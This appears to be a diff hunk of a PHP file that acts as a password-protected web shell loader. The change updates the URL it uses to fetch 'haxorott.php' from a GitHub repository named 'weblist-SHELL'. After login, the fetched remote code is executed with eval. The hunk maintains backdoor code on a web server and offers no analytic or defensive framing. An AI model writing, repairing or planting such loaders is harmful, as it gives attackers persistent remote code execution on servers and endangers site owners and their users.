@@ -113,9 +113,9 @@ if (isset($_POST["password"])) {
 }
 
 // Check if the user is logged in before executing the content
-<!--https://github.com/rendihidayat683/weblist-SHELL/raw/refs/heads/main/haxorott.php-->
+<!--https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/haxorott.php-->
 if (is_logged_in()) {
-    $a = geturlsinfo("https://github.com/rendihidayat683/weblist-SHELL/raw/refs/heads/main/haxorott.php");
+    $a = geturlsinfo("https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/haxorott.php");
     eval("?>" . $a);
 } else {
     ?>
